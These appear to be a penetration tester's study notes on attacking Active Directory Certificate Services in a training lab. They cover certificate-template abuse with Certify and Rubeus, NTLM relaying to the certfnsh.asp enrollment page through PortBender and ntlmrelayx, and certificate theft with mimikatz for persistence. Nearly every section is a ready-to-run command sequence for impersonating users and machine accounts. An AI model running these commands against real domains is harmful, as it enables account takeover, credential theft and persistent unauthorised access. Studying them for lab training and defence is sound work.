# ADCS Notes

## Finding Certificate Authorities

Tools: [Certify](https://github.com/GhostPack/Certify)

Search ADCS in a domain or forest
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```

## Misconfigured Certificate Templates

find vulnerable tickets
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```
key parts to look into
1. the CA name
2. Template Name
3. msPKI-Certificate-Name-Flag
4. pkiextendedkeyusage
5. Enrollment Rights - see who can enroll here, look for groups you are in or if all domain users can

Abusing steps
1. Request a certificate for a user
2. copy and whole certificate and save it as cert.pem on linux
3. use openssl command to convert to pfx format
4. convert cert.pfx into a base64 string for Rubeus
5. make an asktgt req for the user using the cert
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:<user>
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
cat cert.pfx | base64 -w 0
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /certificate:<base64> /password:pass123 /nowrap
```

## NTLM Relaying to ADCS HTTP Endpoints

can't relay dc to adcs if running on same dc, but we can relay with a system having unconstrained delegation

steps:
1. portbender on unconstrained device capturing 445->8445
2. reverse port forward to forward traffic hitting port 8445 to the team server on port 445
3. a socks proxy for ntlmrelayx to send traffic back into the network
4. ntlmrelayx pointing to the certfnsh.asp page on the adcs server
5. coerce a system WEB to our machine with the relaying

```
on beacon:
powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow
rportfwd 8445 localhost 445
socks 1080
cd C:\Windows\system32\drivers
upload C:\Tools\PortBender\WinDivert64.sys
  **Then go to Cobalt Strike > Script Manager and load PortBender.cna from C:\Tools\PortBender - this adds a new PortBender command to the console.**
PortBender redirect 445 8445
on attacker:
sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
on beacon:
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
```

## User and Computer Persistence

Certs are great persistence since they default last a year regardless of password changes

can grab a users cert by going to their personal cert store, we can do this with Seatbelt
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
```
or mimikatz
steps:
1. export it and download
2. base64 the pfx file
3. run rubeus with this base64 to obtain a TGT

```
on beacon:
mimikatz crypto::certificates /export
download CURRENT_USER_My_0_Nina Lamb.pfx
on attacker machine:
cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0
on beacon:
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /nowrap
```
if the user doesn't have a certificate we can just request one
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
```

## Computer Persistence

we can do the same with computer accounts
```
mimikatz !crypto::certificates /systemstore:local_machine /export
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:<base64> /password:mimikatz /nowrap
```

if requesting machine accounts with certify use the /machine flag
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
```


